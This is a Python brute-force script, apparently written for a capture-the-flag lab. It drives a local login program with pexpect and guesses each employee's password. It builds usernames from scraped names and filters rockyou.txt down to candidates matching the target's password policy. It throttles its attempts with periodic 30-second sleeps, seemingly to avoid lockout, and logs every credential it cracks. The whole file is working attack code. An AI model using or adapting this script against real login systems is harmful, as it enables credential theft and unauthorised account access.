# Author: Shubham Raturi
# Details: This script allows you to automate a brute force attack against a user based on the password policy set by the company

#!/usr/bin/env python3
import pexpect
import random
import string
import sys
import re
import gzip
import time
import os
file_name = "ctf_success_file.txt"

# Define the usernames and email addresses
employee_data = {}

# Create a dictionary to store the results
results = {}

# Maximum number of matching passwords to find and use
max_matches = 20000

# List to store the matching passwords
matching_passwords = []

# Launch the program
child = pexpect.spawn("./testlogin.out", encoding='utf-8')

# ALLOWS VIEWING OF THE OUTPUT
child.logfile = sys.stdout

child.expect('Enter')
child.sendline()
child.expect('Enter')

# Extract the output list of names and emails
lines = child.before

# Uses regular expression to extract numbered names and email addresses
matches = re.findall(r'\d+\.\s+([\w\s-]+)\s+([\w@.]+)', lines)
pattern = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[A-Za-z\d]{8}$"

# Populate the employee_data dictionary with usernames
for i, (name, email) in enumerate(matches, start=1):
    parts = name.split()
    if len(parts) == 2:
        first_name, last_name = parts
        username = last_name[0].lower() + first_name.lower()
        employee_data[i] = {"name": name, "email": email, "username": username}

child.sendline()

# Initialize a counter for matching passwords
matches_found = 0
break_counter = 0
# Read the "rockyou.txt.gz" file using the gzip module
with gzip.open('/usr/share/wordlists/rockyou.txt.gz', 'rt', encoding='latin-1') as rockyou:
    for line in rockyou:
        password = line.strip()

        if re.match(pattern, password):
            matching_passwords.append(password)
            matches_found += 1

        if matches_found >= max_matches:
            break

# Check if the file exists and create it if necessary
if not os.path.exists(file_name):
    with open(file_name, "w"):
        pass  # Create an empty file if it doesn't exist

# Iterate through the usernames in the dictionary
for number, data in employee_data.items():
    username = data["username"]
    child.expect('username:')

    for password in matching_passwords:
        # Send the username and password to the executable
        child.sendline(username)
        child.expect('password:')
        child.sendline(password)
        break_counter += 1
        time.sleep(0.1)
        # Wait for the response
        index = child.expect([pexpect.EOF, "domain.", "username:"])

	#If the password is correct it will give a 1
        if index == 1:
            child.sendline('c')
            print(f"Access Granted: {username} - Password: {password}")
            results[number] = {"name": data["name"], "email": data["email"], "username": username, "password": password}
            with open(file_name, "a") as file:
                file.write(f"Access Granted: {username} - Password: {password}\n")
                file.close
            break_counter = 0
            break  # Password found, move on to the next user
       	elif break_counter == 1000:
       	    break_counter = 0
       	    time.sleep(30)
    #breaks the loop if max password is reached
    if len(matching_passwords) >= max_matches:
        continue

# Close the child process
child.close()

# Print the results
for number, data in results.items():
    print(f"Username: {data['username']}, Name: {data['name']}, Email: {data['email']}, Password: {data['password']}")

